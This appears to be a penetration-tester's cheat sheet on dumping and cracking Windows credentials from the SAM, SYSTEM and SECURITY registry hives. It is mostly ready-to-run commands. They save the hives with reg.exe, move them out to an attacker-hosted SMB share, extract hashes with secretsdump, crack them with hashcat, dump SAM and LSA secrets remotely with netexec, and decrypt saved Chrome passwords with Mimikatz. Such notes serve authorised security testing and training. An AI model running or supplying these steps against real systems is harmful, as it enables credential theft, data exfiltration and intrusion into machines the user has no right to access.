# Attacking SAM / SYSTEM / SECURITY

## Local Dump (admin shell on target)

Save all three hives — SYSTEM is required to decrypt SAM, SECURITY gets you DCC2 + DPAPI keys:

```cmd
reg.exe save hklm\sam C:\sam.save
reg.exe save hklm\system C:\system.save
reg.exe save hklm\security C:\security.save
```

Host SMB share on attack host, move files to it:

```bash
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /tmp/loot/
```

```cmd
move sam.save \\<LHOST>\CompData
move system.save \\<LHOST>\CompData
move security.save \\<LHOST>\CompData
```

Dump hashes offline — needs all three files:

```bash
secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
```

Crack NT hashes (mode 1000) — pull the nthash field (4th column) into a file:

```bash
hashcat -m 1000 <HASH_FILE> <WORDLIST>
```

DCC2 from SECURITY (`$DCC2$10240#user#hash`) — mode 2100, ~800x slower than NTLM, not PTH-able:

```bash
hashcat -m 2100 '<DCC2_HASH>' <WORDLIST>
```

## Remote Dump (local admin creds in hand)

SAM remotely — `--local-auth` mandatory for non-domain hosts:

```bash
netexec smb <TARGET> --local-auth -u <USER> -p <PASS> --sam
```

LSA secrets remotely — pulls service account creds, DPAPI keys, NL$KM:

```bash
netexec smb <TARGET> --local-auth -u <USER> -p <PASS> --lsa
```

DPAPI — Chrome/IE/Outlook/RDP saved creds, decrypt with Mimikatz on the target:

```cmd
mimikatz # dpapi::chrome /in:"C:\Users\<USER>\AppData\Local\Google\Chrome\User Data\Default\Login Data" /unprotect
```

> [!tip] NT hash format is `uid:rid:lmhash:nthash` — grab the last field only. `aad3b435b51404eeaad3b435b51404ee` as the LM portion means LM is disabled, ignore it.

> [!warning] DCC2 cracks slow and can't PTH — only worth cracking if you need cleartext for another service. Prioritize NT hashes first.